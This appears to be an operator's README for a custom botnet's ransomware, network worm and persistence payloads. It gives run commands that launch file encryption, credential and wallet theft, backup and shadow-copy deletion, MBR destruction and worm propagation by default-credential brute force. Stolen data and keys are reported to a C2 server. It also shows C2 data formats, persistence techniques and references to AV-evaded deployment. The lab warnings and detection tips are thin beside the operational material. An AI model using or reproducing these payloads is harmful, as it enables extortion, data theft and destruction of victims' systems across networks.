# Advanced Payloads Guide - Ransomware & Network Worm

## ⚠️ CRITICAL WARNING - READ BEFORE USE

These are **HIGHLY DESTRUCTIVE** and **SELF-PROPAGATING** payloads intended for:
- **Isolated lab environments ONLY**
- **Authorized red team demonstrations**
- **Security research in controlled settings**

**NEVER USE ON PRODUCTION SYSTEMS OR NETWORKS WITHOUT EXPLICIT AUTHORIZATION**

---

## 🔒 Ransomware Module

### Overview
DeadSec Ransomware provides file encryption capabilities with C2 integration for authorized penetration testing and impact demonstrations.

### Features

**Core Encryption:**
- **AES-256 Encryption**: Military-grade file encryption using Fernet (PBKDF2HMAC key derivation)
- **Wallpaper Modification**: Changes victim wallpaper to DeadSec branded image
- **Ransom Note**: Generates detailed ransom note with victim ID on Desktop
- **Smart Targeting**: Encrypts 30+ file types in user directories
- **Safety Limits**: Caps at 100 files to prevent complete system lockup
- **Unique Victim ID**: MD5-based identification for key retrieval

**NEW - Data Exfiltration (Pre-Encryption):**
- **Sensitive File Theft**: Steals SSH keys, crypto wallets, password files before encryption
- **Credential Harvesting**: Searches for credentials.txt, passwords.txt, and similar files
- **C2 Exfiltration**: Sends stolen data + encryption keys to C2 server

**NEW - Anti-Recovery Mechanisms:**
- **Shadow Copy Deletion**: Deletes Windows VSS shadow copies (backups)
- **Recovery Disabled**: Disables Windows System Restore
- **Backup Destruction**: Destroys Windows Backup catalog
- **Registry Modifications**: Prevents future restore point creation

**NEW - Persistence:**
- **Registry Run Keys**: Auto-start on user login
- **Scheduled Tasks**: Hourly execution checks
- **Startup Folder**: Multiple persistence vectors
- **Hidden Installation**: Copies to AppData with system-like names

**NEW - Data Destruction (Optional Flags):**
- **Free Space Wiping**: Overwrites deleted file space (prevents recovery)
- **MBR Destruction**: Destroys Master Boot Record (system unbootable)
- **Advanced Wiping**: Multiple pass overwrite for secure deletion

### Files
- `payloads/ransomware.py` - Python implementation (cross-platform)
- `payloads/windows_ransomware.ps1` - PowerShell implementation (Windows-native)

### Targeted File Types
```
Documents: .txt, .pdf, .doc, .docx, .xls, .xlsx, .ppt, .pptx
Images: .jpg, .jpeg, .png, .gif, .bmp, .svg
Databases: .sql, .db, .mdb, .accdb
Code: .py, .js, .php, .html, .css, .java, .cpp
Archives: .zip, .rar, .7z, .tar, .gz
Others: .csv, .xml, .json, .log, .bak
```

### Targeted Directories
- `C:\Users\{user}\Documents` (Windows)
- `C:\Users\{user}\Desktop`
- `C:\Users\{user}\Pictures`
- `C:\Users\{user}\Downloads`
- `/home/{user}/Documents` (Linux)
- `/home/{user}/Desktop`
- `/home/{user}/Pictures`
- `/home/{user}/Downloads`

### Installation
```bash
# Navigate to workspace
cd "C:\Users\User\Documents\code\Malware\CUSTOM BOTNET"

# Activate virtual environment
.venv\Scripts\Activate.ps1

# Install dependencies
pip install cryptography requests
```

### Usage

#### Python Version (Cross-Platform)
```bash
# ALWAYS TEST IN SIMULATION MODE FIRST
python payloads/ransomware.py --simulate

# Standard mode (encryption + anti-recovery + persistence + data theft)
python payloads/ransomware.py --c2 http://192.168.1.10:5000

# With free space wiping (SLOW - can take hours)
python payloads/ransomware.py --c2 http://192.168.1.10:5000 --wipe-free-space

# NUCLEAR OPTION - Destroy MBR (SYSTEM UNBOOTABLE)
python payloads/ransomware.py --c2 http://192.168.1.10:5000 --destroy-mbr

# Full destructive mode (ALL features)
python payloads/ransomware.py --c2 http://192.168.1.10:5000 --wipe-free-space --destroy-mbr
```

**Execution Phases:**
```
Phase 1: Reconnaissance & Data Theft
  - Steal sensitive files (SSH keys, wallets, passwords)
  - Add persistence mechanisms
  
Phase 2: Disable Recovery Mechanisms
  - Delete shadow copies
  - Disable System Restore
  - Destroy backup catalog
  
Phase 3: File Encryption
  - Encrypt target files with AES-256
  - Create ransom notes
  
Phase 4: System Modification
  - Change wallpaper
  - Exfiltrate all data to C2
  
Phase 5 (Optional): Free Space Wiping
  - Overwrite deleted files
  
Phase 6 (Optional): MBR Destruction
  - Make system unbootable
```

#### PowerShell Version (Windows)
```powershell
# Simulation mode
powershell -ExecutionPolicy Bypass -File payloads\windows_ransomware.ps1 -Simulate

# Production mode
powershell -ExecutionPolicy Bypass -File payloads\windows_ransomware.ps1 -C2Server "http://192.168.1.10:5000"
```

#### Web GUI Deployment
1. Navigate to **Payloads** page
2. Select **Ransomware** (marked with 🔒 and orange warning)
3. Click **Quick Deploy** to target bot
4. Or use **Stealth Operations** for AV-evaded version

### C2 Integration

#### Endpoint: `/ransomware_data`
Receives encryption data from infected hosts.

**Request Format:**
```json
{
  "victim_id": "DS-809c627c-I5GXRTZCM2G8",
  "encryption_key": "base64_encoded_key...",
  "encrypted_files": [
    "C:\\Users\\victim\\Documents\\important.docx.deadsec",
    "C:\\Users\\victim\\Desktop\\passwords.txt.deadsec"
  ],
  "hostname": "VICTIM-PC",
  "username": "victim_user",
  "timestamp": "2025-11-05T14:23:45"
}
```

#### Key Storage
- Encryption keys stored in: `ransom_keys/{victim_id}.key`
- Format: JSON with victim data and encryption key
- Use for recovery operations and proof of concept

### Safety Features
- **File Limit**: Maximum 100 files encrypted per execution
- **Simulation Mode**: Test without actual encryption
- **Key Backup**: All keys sent to C2 before encryption starts
- **Skip System Files**: Does not target Windows/System32 or critical OS directories

### Recovery Procedure
```python
# Example decryption script (create based on stored keys)
from cryptography.fernet import Fernet
import json

# Load victim key
with open('ransom_keys/DS-809c627c-I5GXRTZCM2G8.key', 'r') as f:
    data = json.load(f)
    key = data['encryption_key']

# Decrypt files
cipher = Fernet(key.encode())
for encrypted_file in data['encrypted_files']:
    with open(encrypted_file, 'rb') as f:
        encrypted_data = f.read()
    decrypted_data = cipher.decrypt(encrypted_data)
    original_file = encrypted_file.replace('.deadsec', '')
    with open(original_file, 'wb') as f:
        f.write(decrypted_data)
    print(f"[+] Decrypted: {original_file}")
```

---

## 🕸️ Network Worm Module

### Overview
DeadSec Network Worm provides automated lateral movement and bot recruitment capabilities for penetration testing network propagation scenarios.

### Features
- **Network Discovery**: Automatic /24 CIDR subnet scanning
- **Multi-threaded Scanning**: 20 concurrent threads for fast discovery
- **14 Exploit Vectors**: SMB, NetBIOS, RDP, SSH, WinRM, databases, FTP, Telnet, VNC
- **Credential Brute Force**: Tests common username/password combinations
- **Lateral Movement**: Automated exploitation and agent deployment
- **Bot Recruitment**: Deploys python_agent.py on compromised hosts
- **Persistence**: Creates startup entries and scheduled tasks
- **C2 Reporting**: Real-time infection status updates

### Files
- `payloads/network_worm.py` - Python implementation (cross-platform)
- `payloads/windows_network_worm.ps1` - PowerShell implementation (Windows)

### Exploit Ports
```
SMB:        445, 139
RDP:        3389
SSH:        22
WinRM:      5985, 5986 (HTTP/HTTPS)
MSSQL:      1433
MySQL:      3306
PostgreSQL: 5432
MongoDB:    27017
Redis:      6379
Telnet:     23
FTP:        21
VNC:        5900
```

### Common Credentials Tested
```
Username         Password
--------         --------
admin            admin
administrator    password
root             root
guest            guest
user             user123
test             test123
Administrator    Admin123
```

### Installation
```bash
# Core functionality (no dependencies required)
# Network worm works with standard library

# Optional: SSH exploitation support
pip install paramiko
```

### Usage

#### Python Version (Cross-Platform)
```bash
# Stealth mode (default - slower, less detectable)
python payloads/network_worm.py --c2 http://192.168.1.10:5000

# Aggressive mode (faster scanning, more detectable)
python payloads/network_worm.py --c2 http://192.168.1.10:5000 --aggressive
```

#### PowerShell Version (Windows)
```powershell
# Standard mode
powershell -ExecutionPolicy Bypass -File payloads\windows_network_worm.ps1 -C2Server "http://192.168.1.10:5000"

# With custom target network
powershell -ExecutionPolicy Bypass -File payloads\windows_network_worm.ps1 -C2Server "http://192.168.1.10:5000" -TargetNetwork "10.0.0.0/24"
```

#### Web GUI Deployment
1. Navigate to **Payloads** page
2. Select **Network Worm** (marked with 🕸️ and red pulsing animation)
3. Click **Quick Deploy** to target bot
4. Or use **Stealth Operations** for AV-evaded version

### C2 Integration

#### Endpoint: `/worm_report`
Receives propagation reports from active worms.

**Request Format:**
```json
{
  "worm_id": "WORM-4b978345-LHP0SCWH",
  "infected_hosts": [
    "192.168.1.101",
    "192.168.1.105",
    "192.168.1.110"
  ],
  "network_map": {
    "192.168.1.101": ["445", "3389"],
    "192.168.1.105": ["22", "80"],
    "192.168.1.110": ["445", "5985"]
  },
  "exploit_methods": {
    "192.168.1.101": "SMB",
    "192.168.1.105": "SSH",
    "192.168.1.110": "WinRM"
  },
  "timestamp": "2025-11-05T14:30:12"
}
```

### Operational Flow
1. **Network Discovery**: Scans local subnet for active hosts
2. **Port Scanning**: Checks 14 common exploit ports on each host
3. **Vulnerability Assessment**: Identifies accessible services
4. **Credential Testing**: Attempts authentication with common credentials
5. **Exploitation**: Gains access via vulnerable services
6. **Agent Deployment**: Copies and executes python_agent.py
7. **Persistence**: Creates startup entries on compromised host
8. **C2 Reporting**: Reports successful infection
9. **Lateral Movement**: Repeats from step 1 on new host

### Safety Features
- **IP Limit**: Scans maximum 50 IPs per iteration
- **Timeout**: 0.5 second port scan timeout (prevents hanging)
- **Localhost Protection**: Does not attack 127.0.0.1/localhost
- **Configurable Exclusions**: Can specify IP exclusion list
- **Controlled Threading**: Limits to 20 concurrent threads

### Stealth vs Aggressive Mode

| Feature          | Stealth Mode       | Aggressive Mode    |
|------------------|--------------------|--------------------|
| Scan Speed       | Slower (1s delay)  | Fast (0.1s delay)  |
| Thread Count     | 10 threads         | 20 threads         |
| Port Timeout     | 1.0 second         | 0.5 second         |
| Retry Attempts   | 1                  | 3                  |
| Detectability    | Lower              | Higher             |

### Lab Environment Setup

#### Required Infrastructure
```
1. Isolated Virtual Network (VMware/VirtualBox/Hyper-V)
2. C2 Server VM (Ubuntu/Windows)
3. Target VMs (3-5 systems):
   - Windows 10/11 (with SMB, RDP enabled)
   - Ubuntu/Debian (with SSH enabled)
   - Windows Server (with WinRM enabled)
4. NO INTERNET CONNECTIVITY
5. Network segment isolation from production
```

#### Pre-Test Checklist
- [ ] Network completely isolated from production
- [ ] All VMs have snapshots taken
- [ ] C2 server is running and accessible
- [ ] Target services are enabled (SMB, SSH, RDP, etc.)
- [ ] Credentials match worm's test list (for demo purposes)
- [ ] Monitoring tools ready (Wireshark, tcpdump)
- [ ] Kill switch prepared (stop C2 server script)

#### Post-Test Cleanup
```bash
# Stop worm propagation
# Method 1: Stop C2 server (worm will fail to report and stop)
# On C2 server:
pkill -f cnc_server.py

# Method 2: Kill worm processes on infected hosts
# SSH to each host:
pkill -f network_worm.py

# Method 3: Restore VM snapshots
# Revert all VMs to pre-test state
```

---

## 🎯 Attack Scenarios

### Scenario 1: Ransomware Impact Demonstration
**Objective**: Demonstrate file encryption impact on test system

1. Setup isolated Windows VM with test documents
2. Deploy python_agent.py to establish C2 connection
3. Test ransomware in simulation mode: `ransomware.py --simulate`
4. Deploy actual ransomware: `ransomware.py --c2 http://cnc:5000`
5. Observe wallpaper change and ransom note creation
6. Verify encryption keys received at C2 (`ransom_keys/` directory)
7. Demonstrate recovery using stored keys

### Scenario 2: Lateral Movement Demonstration
**Objective**: Show network propagation and bot recruitment

1. Setup 3-VM isolated network (C2 + 2 targets)
2. Configure targets with vulnerable services (SMB, SSH)
3. Deploy initial bot on Target 1
4. Deploy network worm: `network_worm.py --c2 http://cnc:5000`
5. Monitor C2 `/worm_report` endpoint for infection reports
6. Observe automatic bot recruitment on Target 2
7. Demonstrate command execution on recruited bots

### Scenario 3: Full Red Team Chain
**Objective**: Complete attack chain from initial access to impact

1. Initial Access: Deploy python_agent.py on entry point
2. Reconnaissance: Run network_scanner.py to map environment
3. Lateral Movement: Deploy network_worm.py to spread
4. Credential Harvesting: Run credential_harvester.py on all bots
5. Impact: Deploy ransomware.py on high-value targets
6. Exfiltration: Collect encryption keys and credentials from C2

---

## 🛡️ Detection and Mitigation

### How These Payloads Can Be Detected

**Ransomware Indicators:**
- Mass file modifications in short time period
- High disk I/O activity
- Creation of ransom note files
- Wallpaper modification
- Outbound connections to C2 server
- Process spawning with encryption keywords

**Network Worm Indicators:**
- Port scanning activity (multiple ports across subnet)
- Failed authentication attempts (brute force)
- Lateral movement via SMB/WinRM/SSH
- New scheduled tasks or startup entries
- Python/PowerShell processes with network activity
- Multiple concurrent connections to same ports

### Defensive Measures

**Ransomware Protection:**
- Regular backups (offline/immutable)
- File integrity monitoring (FIM)
- Endpoint Detection and Response (EDR)
- Network segmentation
- User permission restrictions
- Application whitelisting

**Worm Protection:**
- Network segmentation (VLANs)
- Intrusion Detection Systems (IDS/IPS)
- Strong authentication (no default credentials)
- Disabled unnecessary services
- Patch management
- Port-based ACLs

---

## 📊 Testing Checklist

### Pre-Deployment
- [ ] Obtained explicit written authorization
- [ ] Confirmed isolated test environment
- [ ] Backed up all test systems
- [ ] Created VM snapshots
- [ ] Documented scope of testing
- [ ] Prepared cleanup procedures
- [ ] Set up monitoring tools
- [ ] Tested in simulation mode first

### During Testing
- [ ] Monitor C2 console output
- [ ] Log all payload activities
- [ ] Watch network traffic (Wireshark)
- [ ] Document observed behaviors
- [ ] Track infection spread (network worm)
- [ ] Verify encryption key storage (ransomware)

### Post-Testing
- [ ] Stop all payloads
- [ ] Remove persistence mechanisms
- [ ] Restore affected systems
- [ ] Verify complete cleanup
- [ ] Delete collected sensitive data
- [ ] Document findings
- [ ] Update defensive recommendations

---

## 🚨 Incident Response

### If Ransomware Deploys Unintentionally

1. **IMMEDIATE**: Isolate affected system (disconnect network)
2. Identify victim ID from ransom note or C2 logs
3. Retrieve encryption key from `ransom_keys/{victim_id}.key`
4. Create decryption script using Fernet cipher
5. Decrypt files in reverse order of encryption
6. Verify file integrity
7. Restore from backups if decryption fails
8. Investigate root cause

### If Network Worm Escapes Containment

1. **IMMEDIATE**: Shut down C2 server (worm will stop reporting and cease)
2. Identify all infected hosts from `/worm_report` logs
3. Isolate affected network segment
4. Kill worm processes on all infected hosts: `pkill -f network_worm.py`
5. Remove persistence mechanisms (cron, startup, registry)
6. Change all credentials used in brute force list
7. Patch exploited vulnerabilities
8. Restore systems from clean snapshots

---

## 📚 Additional Resources

- **Main README**: `payloads/README.md` - Complete payload documentation
- **AV Evasion Guide**: `Read-me(S)/AV_EVASION_GUIDE.md` - Stealth deployment
- **Web GUI Guide**: `Read-me(S)/WEB_GUI_GUIDE.md` - GUI deployment
- **Quick Start**: `Read-me(S)/QUICK_START.md` - Getting started
- **Red Team Guide**: `Read-me(S)/RED_TEAM_GUIDE.md` - Operational procedures

---

## 🔐 Persistence Module

### Overview
The Persistence Module provides advanced methods for maintaining access across system reboots and security updates.

### Features
**Windows Persistence:**
- Registry Run Keys
- Scheduled Tasks (hourly + on logon)
- Startup Folder entries
- WMI Event Subscriptions
- Windows Services (requires admin)

**Linux/Mac Persistence:**
- Cron Jobs (@reboot + periodic)
- Systemd Services (Linux only)
- Bash Profile/.bashrc modifications
- Hidden binary installation

### File
- `payloads/persistence.py` - Universal persistence manager

### Usage

#### Standalone Mode
```bash
# Install all applicable persistence methods
python payloads/persistence.py --payload /path/to/malware.exe --method all

# Install specific method
python payloads/persistence.py --payload /path/to/malware.exe --method registry
python payloads/persistence.py --payload /path/to/malware.exe --method task
python payloads/persistence.py --payload /path/to/malware.exe --method cron
```

#### Integration with Other Payloads
```python
from payloads.persistence import PersistenceManager

# In your payload
pm = PersistenceManager(payload_path=__file__)
pm.install_all()  # Install all methods
```

### Persistence Methods Explained

**Registry Run Key (Windows):**
- Copies payload to `%APPDATA%\Microsoft\Windows\System\`
- Adds Run key: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- Executes on user login
- User-level (no admin required)

**Scheduled Task (Windows):**
- Creates task with logon + hourly triggers
- Hidden from Task Scheduler GUI
- Runs with highest available privileges
- Survives reboots and service restarts

**WMI Event Subscription (Windows - Advanced):**
- Creates WMI event filter + consumer
- Triggers on system events
- Very stealthy (rare detection)
- Survives most cleanup attempts

**Cron Job (Linux/Mac):**
- Adds @reboot + */30 (every 30 min) entries
- Hides payload in `.config/systemd/`
- Executes with user permissions

**Systemd Service (Linux):**
- Creates system service with auto-restart
- Survives crashes and reboots
- Requires root/sudo access
- Professional-grade persistence

### Detection & Removal

**Check for Persistence (Windows):**
```powershell
# Check registry
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run

# Check scheduled tasks
schtasks /query /fo LIST /v

# Check WMI subscriptions
wmic /namespace:\\root\subscription PATH __EventFilter GET /FORMAT:list
```

**Check for Persistence (Linux):**
```bash
# Check cron jobs
crontab -l

# Check systemd services
systemctl list-unit-files --type=service | grep enabled

# Check bash profile
cat ~/.bashrc ~/.profile
```

---

## ⚖️ Legal Disclaimer

These tools are provided for **AUTHORIZED SECURITY TESTING ONLY**.

**DO NOT USE without:**
- Explicit written authorization from system/network owner
- Clearly defined scope document
- Rules of engagement agreement
- Professional insurance coverage

**Unauthorized use is ILLEGAL** and may result in:
- Criminal prosecution under CFAA and similar laws
- Civil liability
- Financial penalties
- Imprisonment

The authors assume NO LIABILITY for misuse of these tools. By using these payloads, you agree to use them only for legitimate, authorized security testing purposes.

**YOU HAVE BEEN WARNED.**
